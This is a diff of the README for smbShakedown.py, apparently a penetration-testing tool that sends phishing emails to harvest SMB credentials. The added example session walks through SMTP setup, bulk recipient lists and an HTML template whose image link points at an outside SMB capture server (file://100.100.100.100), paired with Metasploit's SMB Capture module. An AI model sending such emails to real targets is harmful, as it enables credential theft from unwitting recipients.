@@ -1,7 +1,7 @@
 #smbShakedown.py
     Description: A simplified SMB Email Client Attack script used for pentests.
     Created by: Nick Sanzotta / @beamr
-    Version: smbShakedown.py v 1.0
+    Version: smbShakedown.py v 1.9102016
   
 ***  
 Installation:
@@ -29,30 +29,66 @@ Usage:
 ***
 Example:
        
-        Enter SMTP Server address[smtp.gmail.com]: 
-        ENTERED: "smtp.gmail.com"
+	External IP: 100.100.100.100
+	Internal IP: 10.37.242.7
+	
+	
+	Enter SMTP Server address[smtp.gmail.com]: 
+	ENTERED: "smtp.gmail.com"
+	
+	Enter your SMTP Server Port[587]: 
+	ENTERED: "587"
+	
+	Enter SMTP Server username[user@gmail.com]: user@gmail.com
+	ENTERED: "user@gmail.com"
+	
+	Enter SMTP Server password: 
+	
+	
+	Enter SMB Capture Server IP address[10.37.242.7]: 
+	ENTERED:10.37.242.7
+	
+	Enter "from name":[Tester]
+	ENTERED:Tester
+	
+	Enter "from address":[user@gmail.com]
+	ENTERED:user@gmail.com
+	
+	Enter recipient(s) name[Client]: Client
+	ENTERED:Client
+	
+	TIP: For multiple addresses, enter a file or seperate with a comma
+	EX:/opt/emailAddresses.txt or user1@company.com,user2@company.com
+	Enter recipient addresses[File or individual email(s)]): /opt/emailAddresses.txt
+	ENTERED:/opt/emailAddresses.txt
+	
+	ENTERED:['user1@company.com', 'user2@company.com']
+	
+	Email Message Template Below:
+	From: Tester <user@gmail.com>
+	To: Client <['user1@company.com', 'user2@company.com']>
+	MIME-Version: 1.0
+	Content-type: text/html
+	Subject: smbShakedown.py test.
+	
+	
+	...
+	<b>smbShakedown.py test message.</b>
+	<br>
+	<img src=file://100.100.100.100/image/foo.gif>
+	
+	Testing Connection to your SMTP Server...
+	('SMTP Server Status: ', 250)
+	Connection to SMTP Server is successful, would you like to send mail now?[yes]:yes
+	ENTERED: "yes"
+	
+	Message(s) sent!
+	no
+	Launch Metasploit's SMB Capture module?[yes]:no
+	ENTERED: "no"
+	
+	Ok, remember to setup your SMBCapture Server elsewhere. 
 
-        Enter your SMTP Server Port[587]: 
-        ENTERED: "587"
-
-        Enter SMTP Server username[user@gmail.com]: 
-        ENTERED: "user@gmail.com"
-
-        Enter SMTP Server password: 
-
-        Enter SMB Capture Server IP address[10.37.242.7]: 
-        ENTERED:10.37.242.7
-
-        Enter "from name":[IT Support]
-        ENTERED:IT Support
-        
-        Enter "from address":[user@gmail.com]:user@gmail.com
-        ENTERED:user@gmail.com
-        
-        Enter recipient(s) name[Bob]: Bob
-        ENTERED:Bob
-        
-        etc..
 
 ***        
 To update email template modify the following in source:
@@ -76,7 +112,6 @@ Becareful not to remove the variables {0},{1},{2},{3} and {4}
 ***
 To do:
 
-	Add file support for recipients
 	Add error handling.
 
 
